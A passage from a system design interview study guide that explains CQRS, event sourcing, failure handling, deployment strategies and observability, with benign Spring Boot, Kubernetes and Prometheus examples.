> When read and write patterns differ a lot — thousands of complex reads per second, few writes with strict rules. CQRS lets me keep a normalized, consistent write model and build denormalized read models (Redis, Elasticsearch, wide tables) fed by events, each scaled independently. The trade-off is eventual consistency between the two and operational complexity, so I'd only adopt it where a cache or read replica isn't enough.

**Common mistakes**
- Assuming CQRS requires event sourcing — it doesn't; CDC from a normal DB works fine.
- Assuming CQRS requires two databases — separate models in one DB (tables vs materialized views) is a valid lightweight form.

**Quick revision**
- Commands change state, queries read projections.
- Projections are fed by events and are eventually consistent.
- Use when reads and writes have very different shapes or scale.

---

## 5. Event Sourcing

> **Level:** 🔴 Advanced

**What is it?** Instead of storing only the **current state** of an entity, store the full sequence of **immutable events** that led to it. Current state is derived by replaying (folding) the events.

```
Traditional DB:   { account: "Alice", balance: 500 }   ← current state only

Event Sourcing:
  AccountCreated   { balance: 0 }
  MoneyDeposited   { amount: 1000 }
  MoneyWithdrawn   { amount: 500 }
  ─────────────────────────────────
  Current balance = 0 + 1000 - 500 = 500   ← derived
```

**Why do we need it?** Some domains need the *history*, not just the latest value: banking ledgers, audits, compliance, "what did the cart look like before the discount was applied?", debugging production by replaying the exact sequence of events.

**How does it work?**
1. A command arrives (`Withdraw 200`).
2. Load the aggregate's events (or the latest **snapshot** + events after it) and rebuild current state.
3. Validate the command against current state (balance ≥ 200?).
4. Append a new event (`MoneyWithdrawn 200`) with an **expected version** — if another writer appended first, the append fails (optimistic concurrency) and you retry.
5. Publish the event; projectors update read models (this is where CQRS pairs naturally).

```mermaid
sequenceDiagram
    participant C as Client
    participant A as Account Aggregate
    participant ES as Event Store
    participant P as Projector
    participant R as Read Model
    C->>A: Withdraw 200
    A->>ES: load snapshot v100 and events after v100
    ES-->>A: events
    A->>A: replay events - balance 500 - validate
    A->>ES: append MoneyWithdrawn expectedVersion 103
    alt version matches
        ES-->>A: ok - now version 104
        ES-->>P: new event
        P->>R: update balance view to 300
        A-->>C: 200 OK
    else another write happened first
        ES-->>A: concurrency conflict
        A-->>C: retry with fresh state
    end
```

**Snapshots:** replaying 10 million events per request is slow, so periodically store a snapshot (state at version N) and replay only the events after it.

**Replay:** you can rebuild any projection from scratch, create a brand-new read model from historical events, or reproduce a bug by replaying to a point in time ("time-travel debugging").

**Schema versioning:** events are stored forever, so old shapes never disappear. Strategies: **upcasting** (convert old event versions to the new shape when reading), versioned event types, weak schemas with optional fields, and (rarely) copy-and-transform migrations of the store.

**Consistency nuance (corrected):** the **event store itself is the strongly consistent source of truth** — appends per aggregate are ordered and protected by optimistic concurrency. It is the **projections / read models** that are eventually consistent. The original notes labeled event sourcing simply "eventual"; that's only true of the read side.

| Benefits | Challenges |
|---|---|
| Full audit trail by design | Event schema evolution is painful |
| Replay to rebuild or create new read models | Storage grows forever (mitigate: snapshots, archiving) |
| Time-travel debugging | Querying current state needs projections |
| Natural fit with event-driven systems and CQRS | Steep learning curve; GDPR "right to erasure" is hard with immutable logs (use crypto-shredding: encrypt personal data per user and delete the key) |

**When to use it:** ledgers, audit-heavy and regulated domains, collaborative editing, systems where "how did we get here?" matters. **Not** for simple CRUD where history is irrelevant — you'd pay a lot of complexity for nothing.

**Tools:** EventStoreDB, Axon Framework (Java), Kafka as a log (with care — it's not an event store with per-aggregate optimistic concurrency), or an append-only table in PostgreSQL.

**Interview perspective**
> **Q: What is event sourcing and what are its drawbacks?**
> Instead of updating a row in place, I append immutable events and derive current state by replaying them, usually with snapshots. That gives a complete audit trail and lets me rebuild or add read models any time. The drawbacks: schema evolution of events that live forever, storage growth, the need for projections to answer queries, and a steeper learning curve. The event store is strongly consistent per aggregate; only the projections are eventually consistent.

### 5.1 Consistency Pattern Comparison

> **Level:** 🟡 Intermediate

Updated version of the original comparison table:

| Pattern | Consistency | Scalability | Complexity | Typical use |
|---|---|---|---|---|
| Single DB ACID transaction | Strong | Limited by one DB | Low | Monolith, one service's own data |
| Saga | Eventual (across services) | High | Medium | Order → payment → inventory |
| CQRS | Strong on write side, eventual on read side | High | High | Read-heavy views, search |
| Event Sourcing | Strong in event store, eventual in projections | High | Very high | Ledgers, audit trails |
| 2PC / XA | Strong (atomic commit) | Low (blocking, coordinator dependency) | High | Within a DB or tightly controlled single-org systems |

**Quick revision**
- Store events, derive state; snapshots keep replay fast.
- Optimistic concurrency with expected version on append.
- Event store = strong; projections = eventual.
- Pair with CQRS; use only when history is a first-class requirement.

---

## 6. Designing for Failure

> **Theme:** Failure is normal. At scale, something is always broken. The goal is not "never fail" but "fail small, fail visibly, recover fast".

Key vocabulary (defined in [Core Quality Attributes](01_system_design_fundamentals.md#3-core-quality-attributes)): **availability** (fraction of time the system answers), **reliability** (it answers *correctly*), **fault tolerance** (it keeps working when components fail), **single point of failure (SPOF)** (a component whose failure takes the whole system down).

### 6.1 Failure Modes Catalog

> **Level:** 🟢 Essential

| Failure | Example | Typical defense |
|---|---|---|
| Process crash | OOM kill, unhandled exception | Multiple instances, health checks, auto-restart (Kubernetes) |
| Machine / VM loss | Hardware failure, spot instance reclaimed | Stateless services, auto-scaling groups, spread across AZs |
| Availability-zone outage | Power or network loss in one data center | Multi-AZ deployment, synchronous DB replica in another AZ |
| Region outage | Whole cloud region degraded | Multi-region with DNS / global LB failover |
| Slow dependency | DB or downstream API at p99 = 10 s | Timeouts, circuit breaker, bulkhead, fallback |
| Network partition | Nodes can't talk to each other | Quorums, fencing, CP/AP choice ([CAP](01_system_design_fundamentals.md#7-cap-theorem-and-pacelc)) |
| Overload | Traffic spike, retry storm | Rate limiting, load shedding, autoscaling, backpressure |
| Bad deploy | Bug in new version | Canary, feature flags, fast rollback |
| Data corruption / deletion | Bad migration, `DELETE` without `WHERE`, ransomware | Backups, point-in-time recovery, immutable backups |
| Dependency on a third party | Payment provider outage | Multiple providers, queue and retry later, graceful degradation |
| Gray failure | Node is "up" for health checks but fails real requests | Deep health checks, outlier detection, client-side error tracking |

> **Interview habit:** after drawing an architecture, walk every box and ask "what happens if this dies or gets slow?" That single habit covers most reliability questions.

### 6.2 Cascading Failures

> **Level:** 🟢 Essential

**What is it?** A failure in one component that spreads to others until the whole system is down — usually triggered by a **slow** dependency, not a dead one.

**How it happens:**

```mermaid
flowchart LR
    users["Users"] --> api["API Service - 200 threads"]
    api -->|"each call waits 30s"| pay["Payment Service - slow"]
    api --> catalog["Catalog calls - also need threads"]
    pay -.->|"threads pile up"| api
    api -.->|"thread pool exhausted"| down["Whole API returns errors"]
    down -.->|"clients retry"| users
```

1. Payment Service becomes slow (not down — slow).
2. API threads calling it wait (no timeout, or a long one), so threads pile up.
3. The thread pool is exhausted; even requests that don't need payment (catalog) can't get a thread.
4. Clients and upstreams retry, multiplying load on an already-sick system (**retry storm**).
5. The whole system is down because of one slow dependency.

**How to stop it** (details in [05](05_distributed_systems_and_messaging.md)):

| Defense | What it does | Link |
|---|---|---|
| **Timeouts** | Bound how long you wait | [05 §15](05_distributed_systems_and_messaging.md#15-timeouts-retries-and-exponential-backoff) |
| **Retries with backoff + jitter + budget** | Retry transient errors without amplifying load | [05 §15](05_distributed_systems_and_messaging.md#15-timeouts-retries-and-exponential-backoff) |
| **Circuit breaker** | Stop calling a failing dependency, fail fast with a fallback | [05 §16](05_distributed_systems_and_messaging.md#16-circuit-breaker) |
| **Bulkhead** | Separate thread/connection pools per dependency so one can't starve others | [05 §17](05_distributed_systems_and_messaging.md#17-bulkhead) |
| **Load shedding** | Reject excess work early and cheaply | §6.4 |
| **Async messaging** | Remove the synchronous dependency entirely | [05 §9](05_distributed_systems_and_messaging.md#9-synchronous-vs-asynchronous-communication) |

How the original notes layered them on one call path:

```
Incoming Request
    ↓
Rate Limiter         (protect from overload)
    ↓
Circuit Breaker      (fail fast if dependency is down)
    ↓
Retry + Backoff      (handle transient failures)
    ↓
Bulkhead             (isolate thread pools)
    ↓
Idempotent Operation (safe to retry)
```

### 6.3 Graceful Degradation

> **Level:** 🟢 Essential

**What is it?** When a non-critical part fails, the system keeps serving the **core function** with reduced quality instead of failing completely.

**Examples:**
- Recommendations service down → show "popular items" from a static cache.
- Reviews service slow → render the product page without reviews.
- Payment provider down → accept the order as `PENDING`, charge later from a queue (the original "`PaymentResponse.queued()`" fallback).
- Search cluster overloaded → disable fuzzy matching and facets, keep exact search.
- Personalized feed fails → serve a cached or chronological feed.
- Netflix: if personalized rows fail, show generic rows — users can still press play.

**How to design it:**
1. Classify every dependency as **critical** (no checkout without inventory) or **optional** (reviews, recommendations).
2. For every optional dependency, define a fallback: cached value, default, empty section, or deferred work.
3. Implement fallbacks with circuit breakers and short timeouts.
4. Use **feature flags / kill switches** to turn off expensive features manually during incidents.
5. Test it: inject failures and check the page still renders.

```java
@CircuitBreaker(name = "recommendations", fallbackMethod = "popularItems")
@TimeLimiter(name = "recommendations")   // e.g. 300 ms
public CompletableFuture<List<Item>> recommendations(String userId) {
    return CompletableFuture.supplyAsync(() -> recoClient.forUser(userId));
}

// fallback: same signature + exception
public CompletableFuture<List<Item>> popularItems(String userId, Throwable t) {
    return CompletableFuture.completedFuture(popularItemsCache.get());
}
```

### 6.4 Load Shedding and Prioritization

> **Level:** 🟡 Intermediate

**What is it?** Deliberately **rejecting** some requests when overloaded, so the remaining ones succeed — better 80% of users served well than 100% served by timeouts.

**How it works:**
1. Measure a saturation signal: in-flight requests, queue depth, CPU, or queueing latency.
2. Beyond a threshold, reject new requests cheaply and early (HTTP `503` with `Retry-After`, or `429` for per-client limits).
3. Shed **low-priority** traffic first: background sync, analytics beacons, prefetches, then free-tier users; keep checkout and login.
4. Drop requests that have already exceeded their deadline — the client gave up, so finishing them is wasted work (**deadline propagation**).

| Traffic class | Example | Shed order |
|---|---|---|
| Critical | Checkout, login, payment | Last |
| Important | Browsing, search | Middle |
| Deferrable | Analytics, recommendations prefetch, batch jobs | First |

**Related:** [rate limiting](02_networking_and_communication.md#14-rate-limiting) protects against *individual* clients; load shedding protects the *server* regardless of who is sending.

### 6.5 Failover

> **Level:** 🟢 Essential

**What is it?** Automatically switching traffic from a failed component to a healthy standby.

| Mode | How it works | Pros | Cons |
|---|---|---|---|
| **Active-passive** (hot/warm standby) | One primary serves traffic; standby is kept in sync and takes over on failure | Simple data consistency (one writer) | Standby capacity sits idle; failover takes seconds to minutes; possible data loss with async replication |
| **Active-active** | All nodes/regions serve traffic simultaneously | No idle capacity, near-zero failover time, lower latency for users near each site | Write conflicts if multiple sites accept writes; complex data replication; each site must handle the extra load when another fails |

```mermaid
flowchart TB
    subgraph ap["Active-Passive"]
        c1["Clients"] --> p["Primary - serving"]
        p -->|"replicate"| s["Standby - idle"]
        s -.->|"promoted on failure"| c1
    end
    subgraph aa["Active-Active"]
        c2["Clients"] --> g["Global LB / DNS"]
        g --> r1["Site A - serving"]
        g --> r2["Site B - serving"]
        r1 <-->|"bi-directional replication"| r2
    end
```

**Failover steps (active-passive DB):** detect failure (missed heartbeats) → confirm (avoid false positives) → **fence** the old primary so it can't accept writes (prevents split-brain — see [05 §6](05_distributed_systems_and_messaging.md#6-consensus-and-leader-election)) → promote the most up-to-date replica → repoint clients (DNS, virtual IP, proxy) → old primary rejoins as a follower.

**Common mistakes:** never testing failover (it fails when you need it); forgetting that in active-active **each site must be sized for the full load** (N+1 capacity); DNS TTLs so long that clients keep hitting the dead site.

### 6.6 Multi-AZ and Multi-Region

> **Level:** 🟡 Intermediate

An **Availability Zone (AZ)** is one or more isolated data centers in a region with independent power and networking, connected to the other AZs by low-latency links (~1–2 ms). A **region** is a geographic area (e.g., `us-east-1`) containing several AZs; regions are hundreds or thousands of km apart (tens to 100+ ms).

```mermaid
flowchart TB
    dns["Global DNS / Anycast LB - health-based routing"]
    subgraph east["Region us-east-1"]
        lbE["Regional LB"]
        subgraph az1["AZ a"]
            appA["App instances"]
            dbP[("DB primary")]
        end
        subgraph az2["AZ b"]
            appB["App instances"]
            dbS[("DB sync standby")]
        end
        lbE --> appA
        lbE --> appB
        dbP -->|"sync replication"| dbS
    end
    subgraph west["Region eu-west-1"]
        lbW["Regional LB"]
        appW["App instances"]
        dbW[("DB async replica")]
        lbW --> appW
    end
    dns --> lbE
    dns --> lbW
    dbP -->|"async cross-region"| dbW
```

**Walkthrough:**
1. **Multi-AZ** (within a region) protects against data-center failures. Synchronous replication is affordable because AZs are close — so an AZ failure loses **no committed data** (RPO ≈ 0) and failover is quick.
2. **Multi-region** protects against region-wide outages and gives lower latency for global users. Cross-region replication is usually **asynchronous** (synchronous would add 70–150 ms to every write), so a region failover may lose the last seconds of writes (RPO > 0).
3. Global DNS / anycast load balancing sends users to the nearest healthy region and fails over when health checks fail.

| | Multi-AZ | Multi-region |
|---|---|---|
| Protects against | Data center failure | Region failure, disasters, regulatory needs |
| Replication | Usually synchronous | Usually asynchronous |
| Latency cost | ~1–2 ms | 50–150+ ms if synchronous |
| Complexity / cost | Moderate — table stakes for production | High — data residency, conflicts, double infra |

> **Interview line:** "Multi-AZ is the default for any production system. I'd go multi-region only if the availability target or global latency requires it, and I'd decide explicitly between active-passive (simpler, some RPO) and active-active (needs conflict handling or data partitioned by region)."

### 6.7 Health Checks

> **Level:** 🟢 Essential

Health checks let load balancers and orchestrators route around failed instances.

| Probe | Question it answers | On failure | Should check |
|---|---|---|---|
| **Liveness** | Is the process stuck/dead? | Restart the container | Only the process itself (event loop alive, no deadlock). **Not** dependencies |
| **Readiness** | Can it serve traffic *right now*? | Remove from load balancer (no restart) | Warm-up done, critical local resources ready (DB pool initialized) |
| **Startup** | Has a slow-starting app finished booting? | Delay liveness checks | Boot complete |

```yaml
# Spring Boot exposes /actuator/health/liveness and /actuator/health/readiness
livenessProbe:
  httpGet: { path: /actuator/health/liveness, port: 8080 }
  periodSeconds: 10
  failureThreshold: 3
readinessProbe:
  httpGet: { path: /actuator/health/readiness, port: 8080 }
  periodSeconds: 5
```

**Common mistake:** making liveness depend on the database. When the DB blips, Kubernetes restarts *every* pod simultaneously — turning a small DB hiccup into a full outage. Liveness = "am I alive", readiness = "should I get traffic".

**Quick revision (section 6)**
- Ask "what if this box dies or gets slow?" for every component.
- Slow dependencies cause cascades: timeouts + circuit breakers + bulkheads + async.
- Degrade gracefully: classify dependencies as critical vs optional.
- Shed low-priority load first; drop requests past their deadline.
- Multi-AZ by default; multi-region when the SLO or users demand it.
- Liveness must not depend on dependencies.

---

## 7. Deployment Strategies

> **Theme:** Most outages are caused by changes. Safe deployment is a reliability feature.

### 7.1 Rolling, Blue-Green, Canary and Shadow

> **Level:** 🟢 Essential

| Strategy | How it works | Pros | Cons | Rollback |
|---|---|---|---|---|
| **Recreate** | Stop all old, start all new | Simplest | Downtime | Redeploy old |
| **Rolling** | Replace instances a few at a time | No extra infra, no downtime | Old and new versions run together; slow rollback | Roll forward/back gradually |
| **Blue-green** | Run full new environment (green) next to old (blue), switch traffic at the LB | Instant switch and instant rollback; test green before switching | 2× infrastructure during deploy; DB must be compatible with both | Switch back to blue |
| **Canary** | Send a small % (1% → 10% → 50% → 100%) to the new version, watch metrics | Limits blast radius; real-traffic validation | Needs good metrics and automation | Route 0% to canary |
| **Shadow (dark launch)** | Copy live traffic to the new version, discard its responses | Zero user impact; great for rewrites | Double load; must avoid side effects (no duplicate charges/emails) | Nothing to roll back |

```mermaid
flowchart LR
    users["Users"] --> lb["Load Balancer / Mesh"]
    lb -->|"95%"| v1["v1 - stable"]
    lb -->|"5%"| v2["v2 - canary"]
    v2 --> mon["Compare error rate and p99 vs v1"]
    mon -->|"healthy"| promote["Increase to 25%, 50%, 100%"]
    mon -->|"regression"| rollback["Route 0% to v2"]
```

**Walkthrough:** the canary receives 5% of traffic; automated analysis compares its error rate and latency to the stable version (tools: Argo Rollouts, Flagger, Spinnaker). If metrics hold, the percentage increases; if not, traffic is pulled automatically — only 5% of users ever saw the bug.

### 7.2 Feature Flags

> **Level:** 🟡 Intermediate

**What is it?** A runtime switch that turns code paths on or off **without redeploying**. It separates **deploy** (code is on the servers) from **release** (users see the feature).

Uses: gradual rollouts by user segment, kill switches during incidents, A/B tests, trunk-based development (merge unfinished code behind a flag).

**Trade-off:** flags are technical debt — every flag doubles the code paths to test. Remove flags after rollout; keep only long-lived operational kill switches. Tools: LaunchDarkly, Unleash, Flagsmith, or a config service.

### 7.3 Database Migrations with Expand and Contract

> **Level:** 🔴 Advanced

During rolling/canary deploys, **old and new code run at the same time against the same database**. A migration that breaks old code (e.g., renaming a column) causes an outage. **Expand-contract** (parallel change) avoids that:

```mermaid
flowchart LR
    s1["1 Expand - add new column, nullable"] --> s2["2 Deploy code that writes both columns"]
    s2 --> s3["3 Backfill old rows into new column"]
    s3 --> s4["4 Deploy code that reads new column"]
    s4 --> s5["5 Stop writing old column"]
    s5 --> s6["6 Contract - drop old column"]
```

Example — renaming `users.name` to `users.full_name`:
1. `ALTER TABLE users ADD COLUMN full_name ...` (old code unaffected).
2. Release code that writes to **both** columns.
3. Backfill `full_name` for existing rows in batches (avoid locking the table).
4. Release code that reads `full_name`.
5. Release code that stops writing `name`.
6. Drop `name` once no running version uses it.

Every step is backward compatible and individually reversible.

### 7.4 Backward Compatibility

> **Level:** 🟢 Essential

Rules that make independent deploys safe:
- **APIs:** additive changes only (new optional fields, new endpoints); never remove/rename fields in place; version for breaking changes ([API versioning](02_networking_and_communication.md#7-rest-api-design)).
- **Tolerant reader:** ignore unknown fields; default missing ones.
- **Events:** same rules, enforced by a schema registry (§3.5).
- **Deploy order:** deploy consumers that can handle the new format *before* producers start sending it.
- **JWT / config / secrets:** support old and new values during a rotation window (see §10.3).

**Interview perspective**
> **Q: How do you achieve zero-downtime deployments?**
> Stateless services behind a load balancer with readiness probes, deployed via rolling or canary so some healthy instances always serve traffic, with connection draining on shutdown. Every change must be backward compatible because old and new versions run side by side: additive API and event changes, expand-contract DB migrations, and dual-key validation during secret rotations. I'd gate the rollout on automated metric analysis and keep a feature flag kill switch for the risky part.

**Quick revision**
- Canary + automated metric analysis = small blast radius.
- Blue-green = instant rollback at 2× cost.
- Feature flags decouple deploy from release.
- Expand → migrate → contract for schema changes.
- Old and new code always coexist during deploys.

---

## 8. Observability

> **Theme:** You can't fix what you can't see. Observability is how you see inside your system.

### 8.1 The Three Pillars

> **Level:** 🟢 Essential

**What is it?** **Observability** is the ability to understand the internal state of a system from its external outputs — mainly **logs, metrics, and traces**. A system is observable when you can answer "what is wrong and why?" *without deploying new code*. **Monitoring** is the subset that watches known failure conditions (dashboards and alerts); observability also lets you investigate unknown ones.

```mermaid
flowchart LR
    svc["Services - instrumented with OpenTelemetry"] --> col["Collector / Agent"]
    col -->|"logs"| logs[("Log store - Elasticsearch, Loki")]
    col -->|"metrics"| mets[("Time-series DB - Prometheus")]
    col -->|"traces"| trs[("Trace store - Jaeger, Tempo")]
    mets --> dash["Dashboards - Grafana"]
    mets --> alert["Alertmanager - PagerDuty, Slack"]
    logs --> dash
    trs --> dash
```

| Pillar | Answers | Data shape | Cost profile |
|---|---|---|---|
| **Metrics** | "Is something wrong? How much, how fast?" | Numbers over time | Cheap, aggregated |
| **Traces** | "Where in the call chain is it slow or failing?" | Tree of timed spans per request | Medium; usually sampled |
| **Logs** | "Why exactly did this request fail?" | Timestamped event records | Expensive at volume |

> **How they work together:** metrics tell you **something** is wrong, traces tell you **where**, logs tell you **why**. Link them with a shared `trace_id`.

Building the backend for this at scale is itself an interview problem: [Distributed Logging and Metrics Platform](08_interview_problems_part2.md#11-distributed-logging-and-metrics-platform).

### 8.2 Logging

> **Level:** 🟢 Essential

**What is it?** A log is an immutable, timestamped record of a discrete event — an error, a user action, a request received, a job completed.

**Structured vs unstructured logging**

```
# Unstructured (hard to search/parse):
2024-01-15 10:23:45 ERROR Failed to process payment for user 123, amount 1500

# Structured JSON (searchable, filterable):
{
  "timestamp": "2024-01-15T10:23:45Z",
  "level": "ERROR",
  "service": "payment-service",
  "trace_id": "abc-123-xyz",
  "user_id": "123",
  "amount": 1500,
  "error": "InsufficientFundsException",
  "message": "Failed to process payment"
}
```

**Always use structured logging in production.** Aggregation tools (ELK, Loki, CloudWatch, Datadog) index the JSON fields, so you can query `service=payment-service AND level=ERROR AND trace_id=abc-123-xyz`.

**Log levels — when to use each**

| Level | When to Use | Example |
|---|---|---|
| **ERROR** | Something failed; needs attention | Payment processing failed |
| **WARN** | Unexpected but the system still works | Retry #2 for external API call |
| **INFO** | Normal events worth knowing | Order placed, service started |
| **DEBUG** | Detailed diagnostics (dev/troubleshooting) | SQL query executed |
| **TRACE** | Very fine-grained (rare in production) | Method entry/exit |

```java
// Spring Boot / Logback structured logging (logstash-logback-encoder)
private static final Logger log = LoggerFactory.getLogger(PaymentService.class);

public PaymentResult processPayment(PaymentRequest request) {
    log.info("Processing payment",
        StructuredArguments.keyValue("orderId", request.getOrderId()),
        StructuredArguments.keyValue("amount", request.getAmount()));
    try {
        PaymentResult result = gateway.charge(request);
        log.info("Payment successful",
            StructuredArguments.keyValue("transactionId", result.getTransactionId()));
        return result;
    } catch (PaymentException e) {
        log.error("Payment failed",
            StructuredArguments.keyValue("orderId", request.getOrderId()),
            StructuredArguments.keyValue("error", e.getMessage()), e);
        throw e;
    }
}
```

**Correlation IDs:** generate (or accept) a request ID at the edge, pass it in headers to every downstream call, and put it in every log line (via SLF4J **MDC** — Mapped Diagnostic Context). With OpenTelemetry the `trace_id` plays this role and Spring Boot 3 adds it to logs automatically.

```java
// Servlet filter that puts a correlation id into the MDC for every log line
public class CorrelationIdFilter extends OncePerRequestFilter {
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain chain)
            throws ServletException, IOException {
        String id = Optional.ofNullable(req.getHeader("X-Request-Id"))
                            .orElse(UUID.randomUUID().toString());
        MDC.put("requestId", id);
        res.setHeader("X-Request-Id", id);
        try { chain.doFilter(req, res); } finally { MDC.remove("requestId"); }
    }
}
```

**ELK stack (Elasticsearch, Logstash, Kibana):**

```mermaid
flowchart LR
    app["App logs - stdout JSON"] --> ship["Shipper - Filebeat or Fluent Bit"]
    ship --> buf[["Kafka buffer - optional"]]
    buf --> ls["Logstash - parse, enrich"]
    ls --> es[("Elasticsearch - index and store")]
    es --> kb["Kibana - search and visualize"]
```

The Kafka buffer absorbs log bursts (e.g., during an incident, when logs spike exactly when you need them) so the indexing tier isn't overwhelmed.

**Common mistakes**
- Logging secrets, tokens, passwords, or full card numbers — mask PII.
- Logging every request at INFO at high QPS — huge cost; sample or use metrics instead.
- No retention policy (hot 7 days, warm/cold 30–90 days, archive to object storage).

### 8.3 Metrics

> **Level:** 🟢 Essential

**What is it?** A metric is a **numeric measurement collected at regular intervals** — request rate, error rate, latency, CPU, queue depth. Metrics are cheap to store and ideal for dashboards and alerts.

**Metric types**

| Type | Definition | Use Case |
|---|---|---|
| **Counter** | Only increases (resets on restart); you graph its *rate* | Total requests, total errors |
| **Gauge** | Goes up or down; current value | Active connections, memory used, queue depth |
| **Histogram** | Counts observations into buckets; percentiles computed at query time and aggregatable across instances | Request latency (p50, p95, p99) |
| **Summary** | Percentiles pre-computed in the client | Similar to histogram; cannot be aggregated across instances |

**The Four Golden Signals (Google SRE)**

| Signal | Definition | Example |
|---|---|---|
| **Latency** | Time to serve a request (separate success and error latency) | p99 API response time < 200 ms |
| **Traffic** | Demand on the system | 12,000 requests/sec |
| **Errors** | Rate of failed requests | Error rate < 0.1% |
| **Saturation** | How "full" the system is | CPU 80%, queue depth 10K, pool 95% used |

Two related checklists:
- **RED** (for request-driven services): **R**ate, **E**rrors, **D**uration.
- **USE** (for resources like CPU, disk, pools): **U**tilization, **S**aturation, **E**rrors.

**Percentiles vs averages**

```
Request latencies (ms): [10, 12, 11, 9, 13, 10, 11, 12, 500, 12]

Average: (10+12+11+9+13+10+11+12+500+12) / 10 = 60ms
p50 (median): 11.5ms
p90: ~13ms
p99: ~500ms

The average describes nobody's experience. One user waited 500 ms.
Use percentiles — especially p95 and p99 — for latency SLOs.
```

**Why tail latency matters:** a page that calls 20 backend services is slowed by the slowest of them. If each has a 1% chance of a slow response, about 18% of page loads (1 − 0.99²⁰) hit at least one slow call. High-percentile latency of dependencies becomes typical latency for users.

**Common mistake:** high-cardinality labels (user ID, request ID as a metric label) — each unique value creates a new time series and can take down Prometheus. Put those in logs/traces, not metric labels.

### 8.4 Prometheus and Grafana

> **Level:** 🟡 Intermediate

> **Prometheus:** open-source metrics system that **scrapes** (pulls) metrics from services at intervals, stores them as time series, and evaluates alert rules.
> **Grafana:** visualization tool that queries Prometheus (and other sources) for dashboards and alerts.

```mermaid
flowchart LR
    svc1["Service A - /actuator/prometheus"] 
    svc2["Service B - /actuator/prometheus"]
    prom["Prometheus - scrape every 15s, store, evaluate rules"]
    prom -->|"pull"| svc1
    prom -->|"pull"| svc2
    prom --> am["Alertmanager"]
    am --> pd["PagerDuty / Slack"]
    graf["Grafana dashboards"] -->|"PromQL"| prom
```

**Spring Boot + Prometheus:**

```xml
<!-- pom.xml -->
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-registry-prometheus</artifactId>
</dependency>
```

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: prometheus, health, info
```

(The registry is auto-enabled when the dependency is present; older Spring Boot 2 configs also set `management.metrics.export.prometheus.enabled: true`.)

```java
// Custom metrics with Micrometer
@Service
public class PaymentService {
    private final Counter paymentCounter;
    private final Timer paymentLatency;

    public PaymentService(MeterRegistry registry) {
        this.paymentCounter = Counter.builder("payments.total")
            .tag("status", "success")
            .register(registry);
        this.paymentLatency = Timer.builder("payments.latency")
            .publishPercentileHistogram()   // enables histogram buckets for p95/p99
            .register(registry);
    }

    public void processPayment(PaymentRequest req) {
        paymentLatency.record(() -> {
            // process payment
            paymentCounter.increment();
        });
    }
}
```

**PromQL examples:**

```promql
# Request rate over last 5 minutes
rate(http_requests_total[5m])

# Error rate percentage
sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m])) * 100

# 95th percentile latency
histogram_quantile(0.95, sum by (le) (rate(http_request_duration_seconds_bucket[5m])))
```

**Pull vs push:** Prometheus pulls, which makes "is the target up?" trivially observable and keeps services simple; short-lived batch jobs that end before a scrape push to a **Pushgateway** instead. For long retention and multi-cluster scale use Thanos, Cortex/Mimir, or VictoriaMetrics.

### 8.5 Distributed Tracing

> **Level:** 🟢 Essential

**What is it?** Tracing follows **one request** as it flows through many services. Each unit of work is a **span** (name, start time, duration, tags, parent span); all spans of one request share a **trace ID** and form a tree.

**Why it's essential in microservices:**

```
Without tracing:
  User reports: "checkout is slow"
  Order Service logs OK, Payment Service logs OK, Inventory OK
  You have no idea which service is the bottleneck ❌

With tracing:
  trace_id: abc-123
  ├── Order Service        [5ms]
  ├── Payment Service      [2ms]
  ├── Inventory Service    [1,450ms] ← HERE is your bottleneck ✅
  └── Notification Service [3ms]
```

**How context propagates:**

```mermaid
sequenceDiagram
    participant GW as API Gateway
    participant O as Order Service
    participant P as Payment Service
    participant DB as Payment DB
    Note over GW: creates trace 4bf9 - span A
    GW->>O: POST /orders - traceparent 4bf9 parent A
    Note over O: span B - child of A
    O->>P: POST /charge - traceparent 4bf9 parent B
    Note over P: span C - child of B
    P->>DB: INSERT payment
    Note over P,DB: span D - child of C - 1400 ms slow
    DB-->>P: ok
    P-->>O: 200
    O-->>GW: 201 Created
    Note over GW,DB: all spans exported to Jaeger - timeline shows span D dominates
```

1. The first service (gateway) starts a trace and a root span.
2. Every outgoing call carries the context in a header. The W3C standard is `traceparent: 00-<trace-id>-<parent-span-id>-<flags>`, e.g. `traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01` (older Zipkin format: `X-B3-TraceId`).
3. Each service creates a child span referencing its parent, and exports spans asynchronously to a collector.
4. The backend (Jaeger, Zipkin, Tempo, AWS X-Ray, Datadog APM) assembles the tree into a timeline.
5. Async hops (Kafka) must propagate context in **message headers** too, or the trace breaks.

**Original trace structure:**

```
Trace: abc-123 (entire request journey)
├── Span 1: API Gateway     start: 0ms     duration: 2ms
├── Span 2: Order Service   start: 2ms     duration: 10ms
│   ├── Span 3: DB query    start: 3ms     duration: 5ms
├── Span 4: Payment Service start: 12ms    duration: 1450ms  ← slow!
└── Span 5: Notification    start: 1462ms  duration: 5ms

Total: 1467ms
```

**OpenTelemetry (OTel)** is the vendor-neutral standard (APIs, SDKs, collector) for traces, metrics, and logs. Instrument once, send anywhere.

```java
// Spring Boot 3: spring-boot-starter-actuator + micrometer-tracing-bridge-otel
// + an exporter (e.g. opentelemetry-exporter-otlp). HTTP clients/servers are traced automatically.
// Manual span for a custom unit of work:
@RestController
public class OrderController {
    private final Tracer tracer;           // io.micrometer.tracing.Tracer
    private final OrderService orderService;

    @PostMapping("/orders")
    public Order createOrder(@RequestBody OrderRequest req) {
        Span span = tracer.nextSpan().name("create-order").start();
        try (Tracer.SpanInScope scope = tracer.withSpan(span)) {
            span.tag("userId", req.getUserId());
            return orderService.create(req);
        } catch (RuntimeException e) {
            span.error(e);
            throw e;
        } finally {
            span.end();
        }
    }
}
```

**Sampling:** tracing every request at 100K QPS is expensive. **Head sampling** keeps e.g. 1% decided at the start (cheap, but may miss rare errors); **tail sampling** decides after the trace completes — keep all errors and slow traces, sample the rest (better signal, needs a collector buffering traces).

### 8.6 Alerting

> **Level:** 🟡 Intermediate

**Principles:**
1. **Alert on symptoms, not causes.** Page on "checkout error rate > 2%" or "p99 > 1 s" (what users feel), not on "CPU 85%" (may be harmless). Causes go on dashboards.
2. **Every page must be actionable** and link to a runbook; otherwise it's noise and trains people to ignore alerts.
3. **Alert on SLO burn rate** (§9): page when the error budget is being consumed fast enough to exhaust it soon (e.g., 14× burn over 1 hour), ticket when it's slow.
4. Use severity levels: page (wake someone up) vs ticket (fix during work hours).
